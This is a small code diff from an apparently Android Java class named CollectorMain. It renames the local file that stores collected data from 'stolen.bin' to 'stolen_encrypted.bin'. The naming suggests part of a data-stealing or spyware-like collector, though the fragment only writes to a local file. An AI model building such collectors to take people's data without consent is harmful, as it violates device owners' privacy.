@@ -127,7 +127,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		} finally {
 			FileOutputStream fos=null;
 			try {
-				fos = new FileOutputStream(new File(getFilesDir(), "stolen.bin"));
+				fos = new FileOutputStream(new File(getFilesDir(), "stolen_encrypted.bin"));
 				fos.write(sb.toBytes());
 			} catch (IOException e) {
 				DebugWriter.writeToE("NSPP",e);
